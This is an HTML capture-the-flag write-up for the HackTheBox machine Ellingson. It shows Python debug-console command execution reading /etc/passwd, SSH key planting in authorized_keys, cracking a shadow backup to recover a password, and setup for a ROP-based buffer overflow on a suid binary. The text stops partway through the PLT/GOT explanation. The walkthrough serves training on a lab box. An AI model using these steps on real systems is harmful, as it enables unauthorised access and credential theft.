@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Ellingson</strong></h1>
+        <em>Released: May 2019 / Pwned: August 4th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        The best bit of Ellingson is the binary exploit to reach root. Whilst not easy, or â€œbasicâ€ as some other htb users have called it, it's definitely a fundamental binary exploitation technique. You'll get an immense sense of achievement once you finally spawn that root shell for yourself.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>Summary</strong></h3><br>
+        • Read some articles on Ellingsong Corp's website<br>
+        • Access an article that doesn't exist and find a python console<br>
+        • Add your ssh public key to <code>hal</code>'s <code>authorized_keys</code> file to gain ssh access<br>
+        • Priv-esc to margo by finding a backup of shadow and cracking the included passwords<br>
+        • Exploit a suid binary to spawn a root shell<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.139</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/ellingson#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/ellingson#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.139<br>
+                ...<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.041s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;998&nbsp;filtered&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.6p1&nbsp;Ubuntu&nbsp;4&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66&nbsp;(ED25519)<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;nginx&nbsp;1.14.0&nbsp;(Ubuntu)<br>
+                |_http-server-header:&nbsp;nginx/1.14.0&nbsp;(Ubuntu)<br>
+                |&nbsp;http-title:&nbsp;Ellingson&nbsp;Mineral&nbsp;Corp<br>
+                |_Requested&nbsp;resource&nbsp;was&nbsp;http://10.10.10.139/index<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                ...<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;18.19&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        A full port scan didn't reveal anything new.<br>
+        <br>
+        <strong>Services running</strong><br>
+        - 22/ssh - nothing can be done here, for the time being<br>
+        - 80/http - a website! this is our only place to look at the moment :)<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Ports &amp; Services</strong></h1>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http</strong></h2><br>
+        <code>http://10.10.10.139/</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        We're informed that someone has already infiltrated the system and planted a virus!<br>
+        <br>
+        There's also a memo warning employees about common passwords.<br>
+            <div class="codebox">
+                Suspicious&nbsp;Network&nbsp;activity<br>
+                Please&nbsp;make&nbsp;sure&nbsp;that&nbsp;your&nbsp;passwords&nbsp;are&nbsp;up&nbsp;to&nbsp;date&nbsp;and&nbsp;that&nbsp;you&nbsp;have&nbsp;read&nbsp;our&nbsp;carefully&nbsp;prepared&nbsp;memo&nbsp;on&nbsp;the&nbsp;most&nbsp;common&nbsp;passwords.&nbsp;Now&nbsp;as&nbsp;I&nbsp;so&nbsp;meticulously&nbsp;pointed&nbsp;out&nbsp;the&nbsp;most&nbsp;common&nbsp;passwords&nbsp;are.&nbsp;Love,&nbsp;Secret,&nbsp;Sex&nbsp;and&nbsp;God&nbsp;-The&nbsp;Plague&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <code>http://10.10.10.139/articles/2</code><br>
+        If you check the articles, you'll learn that logging into a service more than 5 times in 1 minute will get you blocked.<br>
+        This rules out brute-forcing.<br>
+            <div class="codebox">
+                Due&nbsp;to&nbsp;the&nbsp;recent&nbsp;security&nbsp;issues&nbsp;we&nbsp;have&nbsp;implemented&nbsp;protections&nbsp;to&nbsp;block&nbsp;brute-force&nbsp;attacks&nbsp;against&nbsp;network&nbsp;services.&nbsp;As&nbsp;a&nbsp;result&nbsp;if&nbsp;you&nbsp;attempt&nbsp;to&nbsp;log&nbsp;into&nbsp;a&nbsp;service&nbsp;more&nbsp;then&nbsp;5&nbsp;times&nbsp;in&nbsp;1&nbsp;minute&nbsp;you&nbsp;will&nbsp;have&nbsp;your&nbsp;access&nbsp;blocked&nbsp;for&nbsp;5&nbsp;minutes.&nbsp;Additional&nbsp;malicious&nbsp;activity&nbsp;may&nbsp;also&nbsp;result&nbsp;in&nbsp;your&nbsp;connection&nbsp;being&nbsp;blocked,&nbsp;please&nbsp;keep&nbsp;this&nbsp;in&nbsp;mind&nbsp;and&nbsp;do&nbsp;not&nbsp;request&nbsp;resets&nbsp;if&nbsp;you&nbsp;lock&nbsp;yourself&nbsp;out&nbsp;...&nbsp;take&nbsp;the&nbsp;5&nbsp;minutes&nbsp;and&nbsp;ponder&nbsp;where&nbsp;you&nbsp;went&nbsp;wrong&nbsp;:)&nbsp;
+            </div>
+        </div><br>
+        <br>
+        You'll notice that the articles are categorised numerically.<br>
+        What happens if we try to visit an article that doesn't exist?<br>
+        <br>
+        <code>http://10.10.10.139/articles/4</code><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        We get an error.<br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Exploit python console</strong></h2><br>
+        If you read the text at the bottom of the page, you'll see that we can open a python console by mousing-over the frame and clicking the console icon.<br>
+            <div class="codebox">
+                For&nbsp;code&nbsp;execution&nbsp;mouse-over&nbsp;the&nbsp;frame&nbsp;you&nbsp;want&nbsp;to&nbsp;debug&nbsp;and&nbsp;click&nbsp;on&nbsp;the&nbsp;console&nbsp;icon&nbsp;on&nbsp;the&nbsp;right&nbsp;side.
+            </div>
+        </div><br>
+        <br>
+        I chose <code>slug = articles[index-1]</code><br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Click the console icon. You should see a <code>[console ready]</code> status<br>
+        <img alt="images\2-5.png" src="images/2-5.png">]<br>
+        <br>
+        We're now in a python console.<br>
+        Import <code>os</code> so that we can run system commands:<br>
+            <div class="codebox">
+                &gt;&gt;&gt;&nbsp;import&nbsp;os
+            </div>
+        </div><br>
+        <br>
+        To read the output of commands we need to direct the output to a file and read it using <code>Path</code><br>
+        Import <code>Path</code>:<br>
+            <div class="codebox">
+                &gt;&gt;&gt;&nbsp;from&nbsp;pathlib&nbsp;import&nbsp;Path
+            </div>
+        </div><br>
+        <br>
+        At this point, we can run system commands by specifying a command in a variable and run it using <code>os.system()</code>.<br>
+        You can read the output of the command using <code>Path("&lt;path to file&gt;").read_text()</code><br>
+            <div class="codebox">
+                &gt;&gt;&gt;&nbsp;cmd&nbsp;=&nbsp;"cat&nbsp;/etc/passwd&nbsp;&gt;&nbsp;/tmp/readme.txt"<br>
+                &gt;&gt;&gt;&nbsp;os.system(cmd)<br>
+                0<br>
+                &gt;&gt;&gt;&nbsp;Path("/tmp/readme.txt").read_text()<br>
+                'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin...&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>3a) Get shell as hal</strong></h3><br>
+        Check which user we are<br>
+            <div class="codebox">
+                &gt;&gt;&gt;&nbsp;cmd&nbsp;=&nbsp;"id&nbsp;&gt;&nbsp;/tmp/readme.txt"<br>
+                &gt;&gt;&gt;&nbsp;os.system(cmd)<br>
+                0<br>
+                &gt;&gt;&gt;&nbsp;Path("/tmp/readme.txt").read_text()<br>
+                'uid=1001(hal)&nbsp;gid=1001(hal)&nbsp;groups=1001(hal),4(adm)\n'
+            </div>
+        </div><br>
+        <br>
+        We're running as <code>hal</code>. Read his <code>/home</code><br>
+            <div class="codebox">
+                &gt;&gt;&gt;&nbsp;cmd&nbsp;=&nbsp;"ls&nbsp;-alh&nbsp;/home/hal&nbsp;&gt;&nbsp;/tmp/readme.txt"<br>
+                &gt;&gt;&gt;&nbsp;os.system(cmd)<br>
+                512<br>
+                &gt;&gt;&gt;&nbsp;Path("/tmp/readme.txt").read_text()<br>
+                '/home/hal:\ntotal&nbsp;36K\ndrwxrwx---&nbsp;5&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;4.0K&nbsp;May&nbsp;&nbsp;7&nbsp;13:12&nbsp;.\ndrwxr-xr-x&nbsp;6&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:21&nbsp;..\n-rw-r--r--&nbsp;1&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;&nbsp;220&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:20&nbsp;.bash_logout\n-rw-r--r--&nbsp;1&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;3.7K&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:20&nbsp;.bashrc\ndrwx------&nbsp;2&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;4.0K&nbsp;Mar&nbsp;10&nbsp;17:33&nbsp;.cache\ndrwx------&nbsp;3&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;4.0K&nbsp;Mar&nbsp;10&nbsp;17:33&nbsp;.gnupg\n-rw-r--r--&nbsp;1&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;&nbsp;807&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:20&nbsp;.profile\ndrwx------&nbsp;2&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;4.0K&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:30&nbsp;.ssh\n-rw-------&nbsp;1&nbsp;hal&nbsp;&nbsp;hal&nbsp;&nbsp;&nbsp;865&nbsp;Mar&nbsp;&nbsp;9&nbsp;19:30&nbsp;.viminfo\n'&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <code>hal</code> has a <code>.ssh</code> directory. We can get ssh access as <code>hal</code> by adding our attacking machine's public key to his <code>authorized_keys</code> file.<br>
+        <br>
+        Read your attacking machine's public key.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/ellingson#&nbsp;cat&nbsp;~/.ssh/id_rsa.pub<br>
+                ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAACAQCqO4k...
+            </div>
+        </div><br>
+        <br>
+        Back on the python interpreter, <code>echo</code> your public key into <code>hal</code>'s <code>authorized_keys</code> file.<br>
+            <div class="codebox">
+                &gt;&gt;&gt;&nbsp;cmd&nbsp;=&nbsp;'echo&nbsp;"ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAACAQCqO4k..."&nbsp;&gt;&gt;&nbsp;/home/hal/.ssh/authorized_keys'<br>
+                &gt;&gt;&gt;&nbsp;os.system(cmd)<br>
+                0<br>
+                &gt;&gt;&gt;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        It worked!<br>
+        <code>ssh</code> in as <code>hal</code> by providing your private key as authentication<br>
+            <div class="codebox">
+                root@gotham:~/ctf/ellingson#&nbsp;ssh&nbsp;hal@10.10.10.139&nbsp;-i&nbsp;~/.ssh/id_rsa<br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;18.04.1&nbsp;LTS&nbsp;(GNU/Linux&nbsp;4.15.0-46-generic&nbsp;x86_64)<br>
+                ...<br>
+                hal@ellingson:~$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        And we're <code>hal</code> on the system.<br>
+        <br>
+        <a id="h1-4" name="h1-4"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) hal -&gt; margo</strong></h2><br>
+        What groups is <code>hal</code> part of?<br>
+            <div class="codebox">
+                hal@ellingson:~$&nbsp;id<br>
+                uid=1001(hal)&nbsp;gid=1001(hal)&nbsp;groups=1001(hal),4(adm)
+            </div>
+        </div><br>
+        <br>
+        <code>adm</code> is an odd result.<br>
+        Have a look at what files the group <code>adm</code> owns.<br>
+            <div class="codebox">
+                hal@ellingson:~$&nbsp;find&nbsp;/&nbsp;-group&nbsp;adm&nbsp;2&gt;/dev/null<br>
+                /var/backups/shadow.bak<br>
+                /var/spool/rsyslog<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        A backup of <code>shadow</code> looks interesting.<br>
+            <div class="codebox">
+                hal@ellingson:~$&nbsp;cat&nbsp;/var/backups/shadow.bak<br>
+                ...<br>
+                theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::<br>
+                hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::<br>
+                margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::<br>
+                duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
+            </div>
+        </div><br>
+        <br>
+        Make a copy of <code>shadow.bak</code> on your attacking machine and crack the hashes using <code>john</code>. It takes a while.<br>
+        If you have a GPU, use <code>hashcat</code> for speedier cracks.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/ellingson#&nbsp;nano&nbsp;shadow.bak<br>
+                theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::<br>
+                hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::<br>
+                margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::<br>
+                duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::<br>
+                root@gotham:~/ctf/ellingson#&nbsp;john&nbsp;--rules&nbsp;--wordlist=/usr/share/wordlists/rockyou.txt&nbsp;shadow.bak<br>
+                Using&nbsp;default&nbsp;input&nbsp;encoding:&nbsp;UTF-8<br>
+                Loaded&nbsp;4&nbsp;password&nbsp;hashes&nbsp;with&nbsp;4&nbsp;different&nbsp;salts&nbsp;(sha512crypt,&nbsp;crypt(3)&nbsp;$6$&nbsp;[SHA512&nbsp;32/32])<br>
+                Cost&nbsp;1&nbsp;(iteration&nbsp;count)&nbsp;is&nbsp;5000&nbsp;for&nbsp;all&nbsp;loaded&nbsp;hashes<br>
+                Will&nbsp;run&nbsp;2&nbsp;OpenMP&nbsp;threads<br>
+                Press&nbsp;'q'&nbsp;or&nbsp;Ctrl-C&nbsp;to&nbsp;abort,&nbsp;almost&nbsp;any&nbsp;other&nbsp;key&nbsp;for&nbsp;status<br>
+                password123&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(theplague)<br>
+                iamgod$08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(margo)
+            </div>
+        </div><br>
+        <br>
+        <code>password123</code> for user <code>theplague</code> doesn't work but <code>iamgod$08</code> for <code>margo</code> does.<br>
+        Log in as <code>margo</code> and grab user.txt!<br>
+            <div class="codebox">
+                hal@ellingson:~$&nbsp;su&nbsp;margo<br>
+                Password:&nbsp;iamgod$08<br>
+                margo@ellingson:/home/hal$&nbsp;cd&nbsp;~<br>
+                margo@ellingson:~$&nbsp;ls&nbsp;-l<br>
+                total&nbsp;4<br>
+                -r--------&nbsp;1&nbsp;margo&nbsp;margo&nbsp;33&nbsp;Mar&nbsp;10&nbsp;18:40&nbsp;user.txt<br>
+                margo@ellingson:~$&nbsp;cat&nbsp;user.txt<br>
+                d0ff9e3...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) margo -&gt; root</strong></h2><br>
+        Check for any suid binaries on the system<br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;find&nbsp;/&nbsp;-perm&nbsp;-u=s&nbsp;2&gt;/dev/null<br>
+                /usr/bin/at<br>
+                /usr/bin/newgrp<br>
+                /usr/bin/pkexec<br>
+                /usr/bin/passwd<br>
+                /usr/bin/gpasswd<br>
+                /usr/bin/garbage<br>
+                /usr/bin/newuidmap<br>
+                /usr/bin/sudo<br>
+                /usr/bin/traceroute6.iputils<br>
+                /usr/bin/chfn<br>
+                /usr/bin/newgidmap<br>
+                /usr/bin/chsh<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <code>/usr/bin/garbage</code> is unusual.<br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;ls&nbsp;-alh&nbsp;/usr/bin/garbage<br>
+                -rwsr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;18K&nbsp;Mar&nbsp;&nbsp;9&nbsp;21:04&nbsp;/usr/bin/garbage
+            </div>
+        </div><br>
+        <br>
+        It's a suid binary owned by root!<br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;/usr/bin/garbage<br>
+                Enter&nbsp;access&nbsp;password:&nbsp;hey<br>
+                <br>
+                access&nbsp;denied.
+            </div>
+        </div><br>
+        <br>
+        Check the strings contained in the binary and you'll find the password.<br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;strings&nbsp;/usr/bin/garbage<br>
+                ...<br>
+                Enter&nbsp;access&nbsp;password:&nbsp;<br>
+                N3veRF3@r1iSh3r3!<br>
+                access&nbsp;granted.<br>
+                access&nbsp;denied.<br>
+                [+]&nbsp;W0rM&nbsp;||&nbsp;Control&nbsp;Application<br>
+                ....
+            </div>
+        </div><br>
+        <br>
+        But the binary isn't of any use to us even with the password.<br>
+        <br>
+        However, this binary might be exploitable because it's taking user input.<br>
+        If we submit 200 A's as the password, we can overflow the buffer and cause a segmentation fault, crashing the binary.<br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;garbage<br>
+                Enter&nbsp;access&nbsp;password:&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+                <br>
+                access&nbsp;denied.<br>
+                Segmentation&nbsp;fault&nbsp;(core&nbsp;dumped)
+            </div>
+        </div><br>
+        <br>
+        We've found our priv-esc to root - overflow the buffer on this suid binary and spawn a root shell.<br>
+        <br>
+        <a id="h1-5" name="h1-5"></a><strong></strong>
+        <h1><strong>Binary Exploit</strong></h1>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) Binary Reconnaissance</strong></h2><br>
+        We first need to run some reconnaissance on the binary so that we understand what we're targeting and of any protection mechanisms we might encounter.<br>
+        <br>
+        Is the target system 32-bit or 64-bit?<br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;uname&nbsp;-mrs<br>
+                Linux&nbsp;4.15.0-46-generic&nbsp;x86_64
+            </div>
+        </div><br>
+        <br>
+        What distribution is running?<br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;cat&nbsp;/etc/*-release<br>
+                DISTRIB_ID=Ubuntu<br>
+                DISTRIB_RELEASE=18.04<br>
+                DISTRIB_CODENAME=bionic<br>
+                DISTRIB_DESCRIPTION="Ubuntu&nbsp;18.04.1&nbsp;LTS"<br>
+                NAME="Ubuntu"<br>
+                VERSION="18.04.1&nbsp;LTS&nbsp;(Bionic&nbsp;Beaver)"<br>
+                ID=ubuntu<br>
+                ID_LIKE=debian<br>
+                PRETTY_NAME="Ubuntu&nbsp;18.04.1&nbsp;LTS"<br>
+                VERSION_ID="18.04"<br>
+                HOME_URL="https://www.ubuntu.com/"<br>
+                SUPPORT_URL="https://help.ubuntu.com/"<br>
+                BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"<br>
+                PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"<br>
+                VERSION_CODENAME=bionic<br>
+                UBUNTU_CODENAME=bionic
+            </div>
+        </div><br>
+        <br>
+        Is ASLR enabled? (Address Space Layout Randomisation)<br>
+            <div class="codebox">
+                margo@ellingson:~$&nbsp;sysctl&nbsp;-a&nbsp;--pattern&nbsp;"randomize"<br>
+                kernel.randomize_va_space&nbsp;=&nbsp;2<br>
+                margo@ellingson:~$&nbsp;cat&nbsp;/proc/sys/kernel/randomize_va_space&nbsp;<br>
+                2
+            </div>
+        </div><br>
+        <br>
+        Copy the binary to your attacking machine so that you can work with it later...<br>
+        Make sure the machine you develop your exploit on is 64-bit.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ellingson#&nbsp;scp&nbsp;margo@10.10.10.139:/usr/bin/garbage&nbsp;.<br>
+                margo@10.10.10.139's&nbsp;password:&nbsp;iamgod$08<br>
+                garbage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;&nbsp;18KB&nbsp;&nbsp;35.5KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Run <code>gdb-peda</code> and check for any protections the binary might have using <code>checksec</code><br>
+            <div class="codebox">
+                root@city64:~/ctf/ellingson#&nbsp;gdb&nbsp;-q&nbsp;garbage<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;garbage...(no&nbsp;debugging&nbsp;symbols&nbsp;found)...done.<br>
+                gdb-peda$&nbsp;checksec<br>
+                CANARY&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled<br>
+                FORTIFY&nbsp;&nbsp;&nbsp;:&nbsp;disabled<br>
+                NX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ENABLED<br>
+                PIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled<br>
+                RELRO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Partial
+            </div>
+        </div><br>
+        <br>
+        <strong>Reconnaissance Summary</strong><br>
+        • 64bit binary<br>
+        • ASLR enabled<br>
+        ◦ All addresses within the binary are randomised each time it's run, so we can't hard-code addresses into our exploit<br>
+        • NX enabled (non-executable stack)<br>
+        ◦ We can't drop code onto the stack and execute it<br>
+        <br>
+        <strong>DISCLAIMER:</strong><br>
+        What's coming next is (most likely) confusing. This stuff is really hard to explain clearly and succinctly, without missing bits out and not writing a wall of text.<br>
+        What's below is pretty much a wall of text. Apologies :/<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>INFO - How to bypass exploit protections?</strong></h2><br>
+        In order to bypass ASLR and deal with the non-executable stack, our exploit is going to be a ROP chain that will leak the address of a function in libc from the GOT, the <em>Global Offset Table</em>.<br>
+        <br>
+        Using this leaked address we can calculate libc's base address, and from there calculate the address of any function in libc that we need. In this case, <code>setuid()</code> and <code>system()</code>, which we can use to spawn a shell.<br>
+        <br>
+        <strong>Bypass Summary</strong><br>
+        • NX - bypass using ROP gadgets<br>
+        • ASLR - bypass by leaking a GOT address and calculating libc's base address<br>
+        <br>
+        LONG-WINDED EXPLANATION OF ROP/ASLR/PLT AND GOT FOLLOWS.<br>
+        You can just skip to the exploit script instead if you prefer :)<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>About ROP</strong></h3><br>
+        ROP stands for Return-Oriented Programming.<br>
+        It's essentially where you use â€œgadgetsâ€, instructions that already exist within the binary, to achieve what you want to do.<br>
+        <br>
+        Normally we would use shellcode to run any instructions we want, but that technique isn't possible here due to NX (non-executable stack) being enabled. Therefore, we have to use gadgets.<br>
+        <br>
+        More on ROP here - <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">https://en.wikipedia.org/wiki/Return-oriented_programming</a><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>About PLT and GOT - Procedure Linkage Table and Global Offset Table</strong></h3><br>
+        Because of ASLR (and because libraries are being dynamically linked). the memory location of library functions will change each time the binary is run.<br>
+        This acts as a defense against attacks.<br>
+        <br>
+        However, the binary itself still needs to know the location of library functions so that it can use them.<br>
+        <br>
+        <strong>How to solve? - PLT and GOT</strong><br>
+        Because of this ability for the address of a library to change, binaries need a way to reliably reference libraries.<br>
+        This is where the PLT and GOT come into play.<br>
+        <br>
+        PLT - Procedure Linkage Table<br>
+        ◦ Has an entry for each library function in your binary, each of which contain a stub pointing to that function in the GOT table<br>
+        <br>GOT - Global Offset Table<br>
+        ◦ Holds a complete list of the memory address/location of every library function you're using in your program<br>
+        <br>
+        <em><strong>Diagram of PLT and GOT</strong></em><br>
+            <div class="codebox">
+                &nbsp;&nbsp;PLT&nbsp;Table&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GOT&nbsp;Table<br>
+                puts()&nbsp;&nbsp;&nbsp;-&nbsp;0x04&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------------&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x04&nbsp;-&nbsp;0x385966298248&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(where&nbsp;puts()&nbsp;is&nbsp;in&nbsp;memory)<br>
